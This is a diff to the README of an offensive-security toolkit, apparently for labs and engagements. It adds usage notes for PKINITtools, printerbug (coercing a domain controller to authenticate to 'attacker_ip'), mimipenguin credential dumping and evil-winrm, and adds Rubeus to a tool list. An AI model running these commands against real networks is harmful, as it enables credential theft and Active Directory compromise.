@@ -180,6 +180,41 @@ keytab2john /etc/krb5.keytab
 
 ---
 
+### PKINITtools & Active Directory Certificate Attacks
+
+Tools for exploiting PKINIT and Active Directory Certificate Services (AD CS). Symlinked to `$HOME/bin`:
+
+```bash
+# Request TGT using a stolen or forged PFX certificate
+gettgtpkinit domain.local/user -cert-pfx cert.pfx out.ccache
+
+# Extract the NTLM hash of the target account from the TGT
+getnthash domain.local/user -key <AS-REP-encryption-key>
+```
+
+---
+
+### krbrelayx & PrinterBug
+
+Toolkit for abusing Kerberos authentication relaying and forced authentication via MS-RPRN Print System Remote Protocol (`printerbug.py`):
+
+```bash
+# Trigger forced machine account authentication from a Domain Controller
+printerbug.py 'domain/user:password@target_dc' 'attacker_ip'
+```
+
+---
+
+### mimipenguin
+
+Dumps cleartext credentials from the memory of target Linux systems (supports GNOME Keyring, vsftpd, etc.). Symlinked as `mimipenguin.sh` and `mimipenguin`:
+
+```bash
+cp "$TOOLS_DIR/mimipenguin/mimipenguin.sh" .
+```
+
+---
+
 ## macOS Command Parity & GNU Utilities
 
 macOS is BSD-based, so several standard Linux tools are either missing or behave differently. The toolkit installs the GNU versions via Homebrew and maps them so copy-pasted Linux commands just work:
@@ -207,7 +242,7 @@ Copy-paste `mysql` commands from writeups and they work.
 
 ### windows-resources (Windows Attack Resources)
 
-Provides an organized directory structure in `$TOOLS_DIR/windows-resources`. Contains authentic Windows binaries, frameworks, and privilege escalation tools (`LaZagne`, `winPEAS`, `mimikatz`, `PowerSploit`, `nishang`, `powercat`, `chisel`, `SharpHound`, `RunasCs`, `PrintSpoofer`, `GodPotato`, `Seatbelt`, `SharpDPAPI`, etc.).
+Provides an organized directory structure in `$TOOLS_DIR/windows-resources`. Contains authentic Windows binaries, frameworks, and privilege escalation tools (`LaZagne`, `winPEAS`, `mimikatz`, `Rubeus`, `PowerSploit`, `nishang`, `powercat`, `chisel`, `SharpHound`, `RunasCs`, `PrintSpoofer`, `GodPotato`, `Seatbelt`, `SharpDPAPI`, etc.).
 
 **How to use:**
 Simply copy the required binary directly into your engagement or lab folder:
@@ -232,6 +267,7 @@ parrot-os-lab        # Parrot OS
 remnux-lab           # REMnux (malware analysis)
 manspider            # MANSPIDER (SMB share spidering and credential searching)
 revshells            # Reverse Shell Generator — local web UI at http://127.0.0.1:8888
+evil-winrm           # WinRM shell (Docker wrapper with automatic evil-winrm-py fallback)
 ```
 
 Containers are temporary by default — removed on exit. For `manspider`, loot and databases are automatically saved to `./manspider` in your current directory.
